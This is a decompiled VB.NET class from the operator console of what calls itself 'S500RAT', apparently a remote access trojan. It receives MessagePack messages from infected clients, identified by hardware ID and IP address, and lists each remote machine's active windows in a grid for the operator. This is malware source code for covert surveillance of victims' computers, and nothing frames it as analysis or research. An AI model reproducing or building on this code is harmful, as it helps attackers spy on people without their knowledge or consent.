Imports System
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200003F RID: 63
	Public Class FrmActiveWindows
		' Token: 0x06001173 RID: 4467 RVA: 0x0009694C File Offset: 0x00094B4C
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim formWindowsActive As FormWindowsActive = CType(Application.OpenForms("FormActiveWindows" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormWindowsActive)
				Dim flag As Boolean = formWindowsActive IsNot Nothing
				If flag Then
					Dim flag2 As Boolean = formWindowsActive.Client Is Nothing
					If flag2 Then
						formWindowsActive.Client = client
						formWindowsActive.Timer1.Enabled = True
					End If
					formWindowsActive.ListWindowsActive.Rows.Clear()
					Dim asString As String = unpack_msgpack.ForcePathObject("Message").AsString
					Dim array As String() = asString.Split(New String() { "-=>" }, StringSplitOptions.None)
					Dim num As Integer = array.Length - 1
					For i As Integer = 0 To num
						Dim flag3 As Boolean = array(i).Length > 0
						If flag3 Then
							Dim flag4 As Boolean = formWindowsActive.Client IsNot Nothing
							If flag4 Then
								formWindowsActive.ListWindowsActive.Rows.Add(New Object() { formWindowsActive.ImageList1.Images("A.png"), array(i), array(i + 1) })
							End If
						End If
						i += 1
					Next
					formWindowsActive.ActiveNum.Text = "Actived [ " + Conversions.ToString(Conversions.ToInteger(formWindowsActive.ListWindowsActive.Rows.Count)) + " ]"
				End If
			Catch ex As Exception
				ListLogs.AddArray("Active Windows " + client.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
